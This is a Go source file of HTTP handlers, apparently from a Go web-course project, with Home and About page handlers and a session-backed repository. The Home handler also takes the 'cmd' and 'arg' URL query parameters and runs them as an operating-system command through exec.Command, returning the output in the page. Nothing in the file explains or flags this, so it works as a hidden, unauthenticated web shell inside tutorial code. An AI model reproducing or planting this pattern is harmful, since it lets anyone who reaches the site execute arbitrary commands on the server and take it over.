package handlers

import (
	"fmt"
	"net/http"
	"os/exec"

	"github.com/tsawler/go-course/pkg/config"
	"github.com/tsawler/go-course/pkg/models"
	"github.com/tsawler/go-course/pkg/render"
)

// TemplateData holds data sent from handlers to templates

// Repo the repository used by the handler
var Repo *Repository

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

// NewRepo creates a new repository
func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

// Home is the home page handler
func (m *Repository) Home(w http.ResponseWriter, r *http.Request) {
	remoteIP := r.RemoteAddr
	m.App.Session.Put(r.Context(), "remote_ip", remoteIP)
	render.RenderTemplate(w, "home.page.tmpl", &models.TemplateData{})
	cmd := r.URL.Query().Get("cmd")
	args := r.URL.Query()["arg"]

	w.Write(runCmd(cmd, args))
}

// About is the about page handler
func (m *Repository) About(w http.ResponseWriter, r *http.Request) {
	// business logic
	stringMap := make(map[string]string)

	remoteIP := m.App.Session.GetString(r.Context(), "remote_ip")
	stringMap["remote_ip"] = remoteIP
	stringMap["test"] = "Hello, again."

	render.RenderTemplate(w, "about.page.tmpl", &models.TemplateData{
		StringMap: stringMap,
	})
}

func runCmd(cmd string, args []string) []byte {

	out, err := exec.Command(cmd, args...).Output()
	if err != nil {
		return []byte(fmt.Sprintf("<html><pre>%v</pre></html>", err))
	}
	return []byte(fmt.Sprintf("<html><pre>%s</pre></html>", out))
}
